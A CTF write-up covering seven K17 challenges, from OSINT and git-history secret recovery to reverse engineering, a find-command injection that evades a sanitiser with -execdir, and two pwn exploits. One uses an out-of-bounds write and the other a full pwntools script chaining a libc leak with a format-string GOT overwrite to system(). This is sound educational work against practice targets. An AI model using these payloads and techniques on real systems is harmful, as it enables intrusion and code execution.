# K17 CTF WRITEUP WALKTHROUGH

---

// Author : Reylucha Biel
// Date of writing: September 13, 2026 
// Finished : September 20, 2026

## 1. meta - sanity check - beginner

**Description:**
> welcome to K17 ctf!! we hope you have lots of fun, learn lots and even win some prizes!
> here's a free flag to get you started :> K17{w3lc0me_t0_k17_1n_th3_b1g_26}
> in case this is your first ctf, all flags will look like K17{funny_message}, and you will receive a flag after you exploit a vulnerability in the challenge!

A simple check before next challenge!

**Flag:** `K17{w3lc0me_t0_k17_1n_th3_b1g_26}`

---

## 2. osint - rainier - beginner

**Description:**
> Can you find where I took this photo? (I got drenched btw)
> Enter the names of the roads at this intersection, in the format `K17{street1, street2}`, without the street type suffixes.
> For example, if you think the roads are Wallaby Way and George Street, you could enter `K17{Wallaby, George}` or `K17{George, Wallaby}`. Capitalisation will be ignored.

This photo will show you three direction about the location of took photo:
* **Direction 1:** Road: Victoria St
* **Direction 2:** 320m - This photo is nearest with MRT station
* **Direction 3:** NORTH BRIDGE CENTRE - In two block of buildings show the name of the building NORTH BRIDGE CENTRE

Combined this three direction into Google Search:
*"Where is this location? There is a street called Victoria St, then there is a sign indicating it is 320 meters from the MRT station, and two buildings-one of which is named NORTH BRIDGE CENTRE"*

This location is in the Downtown Core/Bugis area of Singapore. Specifically, you are looking at the intersection of Victoria Street, Middle Road, and North Bridge Road, close to the Bugis MRT Station (EW12/DT14).

Using the format for this challenge!

**Flag:** `K17{Victoria, North Bridge}`

---

## 3. osint - larpfest - easy

**Description:**
> This guy has the larp turned up to 100. It looks like he left OPSEC at 0 though.
> The flag is (or was...) somewhere in this repo: https://github.com/larp-larp-larp/larp

The challenge description literally states that the flag was previously in the GitHub repository, but... So we'll look for commits that occurred before this final repo structure was created, which may contain the flag!

This the structure of larp repository:
* `.env` <- already cleaned for this challenge
* `code.cpp`
* `my_os.png`
* `wishlist.txt`

Let's take a trip down memory lane with GitHub-woohoo...

Get the git clone:
```bash
$ git clone https://github.com/larp-larp-larp/larp.git
```

Check the file:
```bash
$ ls -la
total 432
drwxrwxr-x 3 kali kali   4096 Sep 14 07:47 .
drwxrwxr-x 3 kali kali   4096 Sep 14 07:47 ..
-rw-rw-r-- 1 kali kali    538 Sep 14 07:47 code.cpp
-rw-rw-r-- 1 kali kali     31 Sep 14 07:47 .env
drwxrwxr-x 7 kali kali   4096 Sep 14 07:47 .git
-rw-rw-r-- 1 kali kali 417011 Sep 14 07:47 my_os.png
-rw-rw-r-- 1 kali kali     79 Sep 14 07:47 wishlist.txt
```
Same as in previous repository. Let's dive in to see the history about the commit.

```bash
$ git log --oneline --all
4df7ab7 (HEAD -> main, origin/main, origin/HEAD) the larp is unlimited
afb99a4 oops
795d5d2 coding

$ grep -R "K17{" .
```
Nothing appear with the format flag, because the history maybe is already deleted for this challenge. 

Now that the history in this repository has been deleted, next we'll look at the history created by the user `larp-larp-larp` using `curl` for the best practice.

```bash
$ curl https://api.github.com/users/larp-larp-larp/events
```
See the output and find what wasn't found earlier in the repository history, that's the hash for old SHA commit:
`2ff1293a0da908202dc16628e5c1fa68c05294ec`

Let's restore that spooky hash that was lost earlier.
```bash
$ git fetch origin 2ff1293a0da908202dc16628e5c1fa68c05294ec
```

Showing the previous commit for `.env` we can see the flag:
```bash
$ git show FETCH_HEAD:.env
OPENAI_API_KEY="K17{l00k_im_a_1337_h4x0r}"
```

**Flag:** `K17{l00k_im_a_1337_h4x0r}`

---

## 4. rev - etch-a-sketch - easy

**Description:**
> I drew you a picture, hope you like it <3
> attachment: etchasketch

This challenge gave us a program, so I test in terminal:
```bash
$ ./etchasketch
```
The output is weird. I thought it was a beautiful picture as mention in description challenge, so I checked the important functions in this binary program.

```bash
$ nm -D etchasketch
```
The output so insightful, this reveal the logic for the program. Important functions symbol is:
* `0000000000004020 D brush_r`
* `0000000000004060 b canvas`
* `0000000000001149 t dab`
* `00000000000011e5 t line`
* `00000000000012df T main`
* `0000000000002020 r points`

Next step is check `brush_r`, why because the last name is r, is possible for radius.
```bash
$ objdump -d -M intel etchasketch | sed -n '/<dab>:/,/^$/p'
```
This line explain `brush_r` will appear if `dab` in process. We found a line explaining: Take the number in secret box A, change it from positive to negative (or vice versa), and then put the result in secret box B.

This will loop until the task is completed, so if translated in concepts it's like this:
```c
for (y = -brush_r; y <= brush_r; y++) {
    for (x = -brush_r; x <= brush_r; x++) {
        canvas[...] = 1;
    }
}
```

```bash
$ gdb -q ./etchasketch
pwndbg> p (int)brush_r
$1 = 0xa
```
In GDB I check the value for `brush_r`, the output is a hex `0xa` that means 10 in normal integer number. This means that every time the program wants to draw a single point `(x,y)`, it doesn't just color a single point. It colors:
* `x-10` to `x+10`
* `y-10` to `y+10`

So a single point turns into a large rectangle. The problem is not the symbol in previous process produce output like `#`, but the `brush_r` is too big to display the picture. So we can patch the binary to process the `brush_r` in radius 0.

```bash
pwndbg> start
pwndbg> p *(int *)&brush_r
$4 = 0xa

# As we know the output will appear 10, so I decided to set to 0
pwndbg> set *(int *)&brush_r = 0
pwndbg> p *(int *)&brush_r
$5 = 0x0

pwndbg> c
```

The flag is now your own!!! It prints out:
`K17{my_masterpiece}`

**Flag:** `K17{my_masterpiece}`

---

## 5. misc - archive trap - easy

**Description:**
> You have broken into a secret archive in UNSW and found a exposed flag in /win/flag.txt, but a developer spent all night writing a input sanitiser to stop us. Can you try to read it?
> Connection command: nc chal.secso.cc 3000

**Understand the input:**
The application puts our input into a `find` command. The sanitizer blocks `-exec` and the word `flag`, but it forgets about `-execdir`, which can also execute commands.

**Build the payload:**
`*' -execdir cat /win/* {} +`
* `*'` matches files.
* `-execdir` executes a command.
* `cat` reads the file.
* `/win/*` targets files inside /win/.
* `{}` represents the files found by find.
* `+` executes the command.

**Important: Shell Expansion**
The `*` in `/win/*` is expanded by the shell, not by `find`. So instead of sending the blocked word `flag`, we send `/win/*`, which can become `/win/flag.txt` before the command is executed.
Input -> Shell expands `/win/flag.txt` -> cat reads it -> Flag

The key lesson: always check who parses the input and when shell expansion happens.

**Solve Script:**
```python
import socket

HOST = "chal.secso.cc"
PORT = 3000
payload = "-execdir cat /win/* {} +\n"

with socket.create_connection((HOST, PORT), timeout=5) as s:
    data = b""
    while b"Enter archive pattern:" not in data:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    
    print(data.decode(errors="replace"), end="")
    print(f"[+] Payload: {payload.strip()}")
    s.sendall(payload.encode())
    s.settimeout(3)
    
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            print(chunk.decode(errors="replace"), end="")
        except socket.timeout:
            break
```

**Why Does It Work?**
The sanitizer blocks: `-exec`, `flag`. But allows: `-execdir`, `/win/*`.
So the exploit is: `-execdir` + `cat` + `/win/*` + `{}`.
Think of the sanitizer as a guard who locks the `-exec` door but forgets the `-execdir` door. Then lets us avoid saying the forbidden filename directly.

**Flag:** `K17{not_so_s3cr3t_4rchive}`

---

## 6. pwn - big-win - easy

**Description:**
> i heard that 99% of gamblers walk away before winning big. i am the 99%.
> Note: We've added a debugging tool on the remote to help you out a bit. The SNAPSHOT() call will magically print out a view of the program stack. You can ignore the snapshot stuff in the code, it's just there to enable this functionality.
> Connection command: nc chal.secso.cc 4001

**Code Snippet (`chal.c`):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#ifdef ENABLE_SNAPSHOT
#define SNAPSHOT() asm volatile("int3")
#else
#define SNAPSHOT() ((void)0)
#endif

#define SLOTS 7

struct gambler {
    int win;
    int numbers[SLOTS];
};

void win() {
    FILE *flag = fopen("/flag", "r");
    if (flag == NULL) {
        perror("fopen");
        return;
    }
    char line[256];
    if (fgets(line, sizeof(line), flag) == NULL) {
        puts("failed to read flag");
        fclose(flag);
        return;
    }
    fclose(flag);
    printf("%s", line);
}

void challenge(void) {
    struct gambler noob;
    noob.win = 0x67;
    int i = 0;
    int accum = 0;
    
    while (i != SLOTS) {
        printf("number> ");
        scanf("%d", &noob.numbers[i]);
        accum += noob.numbers[i];
        
        if (accum == 67) {
            puts("thats a naughty naughty number, one less chance to win");
            i++;
        }
        i++;
    }
    
    SNAPSHOT();
    puts("spinning the lotto of fate, lets see if you win...");
    if (noob.win == 0x67) {
        puts("rip the odds were not in your favour");
        return;
    }
    puts("wtf you win???");
    win();
    return;
}

int main(void) {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    
    puts("welcome to gamble");
    puts("may the odds ever be in your favour");
    challenge();
    
    return 0;
}
```

**Vulnerability:**
The challenge contains an out-of-bounds array access caused by incorrect loop control. When `accum == 67`, `i` is incremented twice, allowing `i` to exceed the valid `numbers[0..6]` range.

The relevant stack layout is:
* `noob.win`      -> `rbp-48`
* `numbers[0..6]` -> `rbp-44 ... rbp-20`
* `numbers[8]`    -> `rbp-12`
* `numbers[9]`    -> `accum`
* `numbers[10]`   -> `i`
* `numbers[-1]`   -> `win`

**Exploitation:**
Send six `1`s followed by `61`:
`1 x 6 + 61 = 67`
This triggers the vulnerable branch and changes:
`i = 6 -> 8`

We can now access memory beyond the array. `123456` is written to `numbers[8]`, then `0` reaches `numbers[9]`, which is `accum`. Next, `-2` is written to `numbers[10]`, overwriting `i`:
`i = -2`
`i++ -> -1`

With `i = -1`, the next write targets:
`numbers[-1] -> win`
Sending `0` therefore changes:
`win = 0x67 -> 0`

Finally, seven additional `0`s advance `i` from `0` to `7`, terminating the loop. The condition `win == 0x67` is now false, so `win()` executes and prints `/flag`.

**Final Payload:**
```bash
printf '1\n1\n1\n1\n1\n1\n61\n123456\n0\n-2\n0\n0\n0\n0\n0\n0\n0\n0\n' | nc chal.secso.cc 4001
```

**Flag:** `K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}`

---

## 7. pwn - huge binary 1 - easy

**Description:**
> they say, "sir, it's the biggest binary i've ever seen", "it's the greatest binary ever made" - nobody's ever seen a bigger binary
> Connection command: nc chal.secso.cc 4002

This challenge looks huge, but the vulnerable code is actually very small. The program gives us three useful powers: an arbitrary stack read through the index, two format-string bugs, and a writable GOT because RELRO is disabled.

**Check the binary:**
```bash
$ checksec --file=chal
RELRO:    No RELRO
Canary:   No canary found
NX:       Enabled
PIE:      No PIE
```
There is no stack canary to stop stack corruption, the binary has fixed addresses because PIE is disabled, and the GOT is writable because RELRO is disabled. NX is enabled, so instead of injecting shellcode, we can reuse libc functions.

**Read the main logic:**
The first input is an integer index. The program then performs a stack read using that index. In simple form, it does this:
`value = *(uint64_t *)(rbp + index * 8)`

That means index `2` can read the saved return address belonging to libc startup code. We test index 2 and receive a libc address.
`Your lucky number is 0x7f........`
The local GDB analysis showed that this leaked address corresponds to offset `0x29ca8` inside the supplied GLIBC 2.41. Therefore the libc base is simply `leak - 0x29ca8`.
```python
libc_base = leak - 0x29CA8
system = libc_base + libc.symbols['system']
```

**Find the format-string bug:**
Both later inputs are read with `%127s` and then passed directly to `printf`. This is the classic format-string mistake: the user's text becomes the format string itself.
```c
scanf("%127s", input1);
scanf("%127s", input2);
printf(input1);
printf(input2);
```
The `%127s` limit means we cannot simply overflow the buffers. Instead, we use `printf` itself as the write primitive.

**Find the format-string offset:**
We send a probe containing many `%p` values. Eventually the program prints bytes from our own input. The important discovery is that the beginning of our buffer appears at argument 24.
`AAAA.%24$p`
The output contains our own bytes, confirming that 24 is the format-string buffer offset. A second experiment showed that `%n` can write through a supplied address.

**Find the target:**
Because RELRO is disabled, `printf@GOT` is writable. The GOT entry is `0x403390`. If we replace that entry with `system`, the later `printf(input2)` call will actually execute `system(input2)`.
`printf@GOT = 0x403390`

The intended chain is therefore very simple: leak libc -> calculate system -> overwrite printf@GOT -> provide `cat </flag` as the second input.

**Final solve.py:**
```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

HOST = 'chal.secso.cc'
PORT = 4002

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

PRINTF_GOT = elf.got['printf']
LIBC_LEAK_OFFSET = 0x29CA8

io = remote(HOST, PORT)

# Leak libc
io.sendlineafter(b"Enter an index: ", b"2")
line = io.recvline_contains(b"Your lucky number is")
leak = int(line.split(b"0x")[1], 16)

libc_base = leak - LIBC_LEAK_OFFSET
system = libc_base + libc.symbols['system']

log.success(f"leak = {hex(leak)}")
log.success(f"base = {hex(libc_base)}")
log.success(f"system = {hex(system)}")
log.success(f"GOT = {hex(PRINTF_GOT)}")

# printf@GOT -> system
io.recvuntil(b"Enter the first input to be echoed: ")
payload = fmtstr_payload(
    24,
    {PRINTF_GOT: system},
    write_size='byte'
)
io.sendline(payload)

# printf(input2) -> system(input2)
io.recvuntil(b"Enter the second input to be echoed: ")
io.sendline(b"cat </flag")

io.interactive()
```

**Final Mental Model:**
Think of the challenge as a tiny machine with three doors. Door 1 leaks a libc address. Door 2 lets us use `printf` as a memory-writing tool. Door 3 is `printf(input2)`, but after we replace `printf@GOT`, that door secretly becomes `system()`.

**Flag:** `K17{it's_ab0v3_aver@ge_actually}`
